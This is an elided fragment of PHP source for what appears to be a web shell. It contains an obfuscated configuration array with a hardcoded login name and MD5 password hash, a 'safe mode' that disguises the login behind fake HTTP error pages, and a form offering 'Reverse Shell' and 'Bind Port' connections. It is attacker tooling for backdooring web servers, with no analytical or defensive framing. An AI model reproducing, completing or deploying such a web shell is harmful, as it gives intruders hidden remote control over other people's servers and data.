...
$GLOBALS['NeUSMyPGXP'] = array(
	'usmfzmlHFCje' => 'bntg11',//login username
	'paLDRhHfAovu' => '9e5dd36709f22a534b8d93f8b29a77e3',//login password (MD5)... ehsan
	'saEuEgnDlHuL' => '1',//safe mode.. 0 = allow, 1 = deny
	'logXKTfQPNcx' => '500',//safe mode type.. gui = login and HTTP errors accepted: 500, 404, 403
	'shiJVQhUrFkw' => '0',//show icons.. 0 = not show, 1 = show
...
<style type="text/css">
.hlabale {
    color: #67ABDF;border-radius: 4px;
...
<div class=\"txtfont\">Mehtod:</div> <selectname='cbmethod' onChange='ctlbc(this);' style='width:120px;'><option value='back'>Reverse Shell</option><option value='bind'>Bind Port</option></select> <div class=\"txtfont\">Use:</div> <select name='selectCb'>";
